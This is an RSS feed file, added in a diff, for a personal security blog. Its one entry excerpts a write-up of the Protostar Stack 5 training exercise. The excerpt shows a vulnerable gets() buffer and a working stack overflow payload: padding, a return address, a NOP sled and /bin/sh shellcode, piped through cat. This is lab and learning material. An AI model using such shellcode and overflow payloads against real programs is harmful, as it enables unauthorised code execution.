@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>machine on B0YK4</title>
+    <link>https://b0yk4.github.io/tags/machine/</link>
+    <description>Recent content in machine on B0YK4</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 23 Aug 2021 14:53:32 +0200</lastBuildDate>
+    
+	<atom:link href="https://b0yk4.github.io/tags/machine/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Protostar machine</title>
+      <link>https://b0yk4.github.io/posts/protostar/protostar/</link>
+      <pubDate>Mon, 23 Aug 2021 14:53:32 +0200</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/protostar/protostar/</guid>
+      <description>Stack 5 int main(int argc, char **argv) { char buffer[64]; gets(buffer); } just direct BOF we will overwite the return address of the main with the address of the beginning of our evel code which begins with nope slids and then the shellcode
+ the reason of using cat to serve our shell with stdi/o
+ $ (python -c &amp;#39;import struct; BOF = 76*&amp;#34;A&amp;#34;; jmpaddr=struct.pack(&amp;#34;I&amp;#34;,0xbffff7f0); nope = 100*&amp;#34;\x90&amp;#34;; shell =&amp;#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&amp;#34;; print BOF+jmpaddr+nope+shell&amp;#39;; cat) | .</description>
+    </item>
+    
+  </channel>
+</rss>
